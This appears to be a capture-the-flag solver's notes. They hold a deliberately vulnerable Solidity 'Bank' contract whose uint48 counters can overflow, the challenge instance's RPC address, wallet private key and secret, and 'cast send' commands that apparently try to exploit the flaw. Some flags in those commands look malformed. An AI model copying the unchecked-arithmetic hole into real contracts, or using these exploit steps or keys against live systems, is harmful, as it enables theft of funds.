pragma solidity ^0.7.0;

contract Bank {
    uint48 flag_cost = 281474976710655;
    uint48 amount_you_have = 0;
    uint48 loaned = 0;
    function deposit(uint48 amount) public payable {
        require(msg.sender==YOUR_WALLET_ADDRESS,"Please use the wallet provided to you"); // This is for security purposes
	require(amount==msg.value,"Please send exact amount");
        amount_you_have += amount;
    }
    function withdraw(uint48 amount) public payable {
        require(msg.sender==YOUR_WALLET_ADDRESS,"Please use the wallet provided to you"); // This is for security purposes
        require((amount) < amount_you_have, "You cannot withdraw what you do not have!");
        amount_you_have -= amount;
        msg.sender.call{value:amount}("");
    }

    function getMoney() public payable {
        // Used for deployment, can be safely ignored
    }
    function loan(uint48 amount) public payable {
        require(msg.sender==YOUR_WALLET_ADDRESS,"Please use the wallet provided to you"); // This is for security purposes
        loaned += amount;
        msg.sender.call{value:amount}("");
    }

    function isChallSolved() public view returns (bool solved) {
        if ((amount_you_have >= flag_cost) && (loaned == 0)) {
            return true;
        }
        else {
            return false;
        }
    }


}


Choice: 1
contract address: 0x51dF9a0b1cD223809109638e44f17fD9470Aa261
rpc-url: http://34.30.117.150:47241
Wallet private-key: 0x9394b2ae44e885a5e62acb2576fc1932b453f7fd9695cff153256cf744bec68e
Wallet address: 0x5E811035540ce13F8CC45944Ec27EeA378289bc5
Secret: 92a8756298a32aead5ca058299eab59646582943ecca100c2b61dd98ade5298f
Please save the provided secret, it will be needed to get the flag


cast send 0x51dF9a0b1cD223809109638e44f17fD9470Aa261  "loan(uint48)" 5 —-private-key 0x9394b2ae44e885a5e62acb2576fc1932b453f7fd9695cff153256cf744bec68e  --rpc-url http://34.30.117.150:47241

cast send 0x51dF9a0b1cD223809109638e44f17fD9470Aa261  "deposit(uint48)"  281474976710600  --rpc-url http://34.30.117.150:47241 --private-key 0x9394b2ae44e885a5e62acb2576fc1932b453f7fd9695cff153256cf744bec68e  --value 281474976710600 --gas-limit 1